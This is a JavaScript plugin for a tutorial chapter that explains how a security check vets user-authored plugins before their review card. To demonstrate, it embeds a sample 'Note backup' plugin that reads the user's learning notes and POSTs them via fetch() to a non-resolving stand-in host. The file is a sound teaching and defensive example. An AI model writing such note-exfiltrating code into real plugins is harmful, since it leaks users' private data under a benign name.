// Chapter 12, a second pair of eyes. Its words are in chapter-12-security.html.
//
// Before any plugin of your own reaches its review card, the kernel runs
// plugins:beforeAdd with its code and what it asks for, and a checker may
// stop it. On this page that's Security check (security-check.js), plain
// rules with no model; the security agent (security.agent.md) does the same
// with a model. This chapter lists what the check decided (its
// security-reviews collection) and has a button that tries to save a plugin
// that reads your notes and reaches the internet: a real save, through the
// same authoring.save the editor and the builder use, which the check stops
// before you see a card. Switch Security check off on the switchboard and try
// again: then the card shows, and the choice is yours alone.

export const manifest = {
  id: "chapter-12-security",
  name: "Chapter 12: A second pair of eyes",
  description: "Explains the checks a plugin goes through before its review card, and tries one that should be stopped.",
  version: "1.0.0",
  permissions: ["ui", "plugins:author", "data:read:security-reviews"],
  scope: "tab",
};

/** A plugin that reads your notes and may reach the internet: what the check is for. */
const RISKY = `// Note backup: copies your learning notes to a server.
export const manifest = {
  id: "note-backup",
  name: "Note backup",
  description: "Keeps a copy of your learning notes.",
  version: "1.0.0",
  permissions: ["data:read:learning", "network"],
};

export default async function (ctx) {
  const notes = await ctx.call("data", "list", "learning");
  await fetch("https://notes-backup.invalid/collect", { method: "POST", body: JSON.stringify(notes) });
}
`;

export default function (ctx) {
  const views = ctx.ui.views("chapter-12-security.html");
  let outcome = "";
  let tone = "";
  let trying = false;

  const view = views.live(
    "security",
    "chapter",
    async (c) => {
      const reviews = (await c.call("data", "list", "security-reviews").catch(() => [])).sort((a, b) => String(b.at).localeCompare(String(a.at))).slice(0, 5);
      return {
        reviews: reviews.map((r) => ({ id: r.id, name: r.name, blocked: r.verdict === "blocked", verdict: r.verdict === "blocked" ? "Stopped" : "Let through", reason: r.reason ?? "" })),
        none: !reviews.length,
        code: RISKY,
        outcome,
        tone,
        done: !!outcome,
        trying,
      };
    },
    { order: 1 },
  );

  ctx.ui.onEvent(async (action) => {
    if (action !== "try" || trying) return;
    trying = true;
    outcome = "";
    view.refresh();
    const saved = await ctx.call("authoring", "save", RISKY).catch((e) => ({ ok: false, error: e instanceof Error ? e.message : String(e) }));
    trying = false;
    if (saved.ok) {
      outcome = "You accepted it, so Note backup is one of your plugins now. Remove it in Customize (notes-backup.invalid is a name that never resolves, so nothing went anywhere).";
      tone = "warn";
    } else if (saved.blocked) {
      outcome = `${saved.error}. You never saw a card: nothing was saved.`;
      tone = "ok";
    } else {
      outcome = `Not saved: ${saved.error ?? "you declined it"}. With the check off, the card was the only thing between it and your notes.`;
      tone = "ok";
    }
    view.refresh();
  });
}
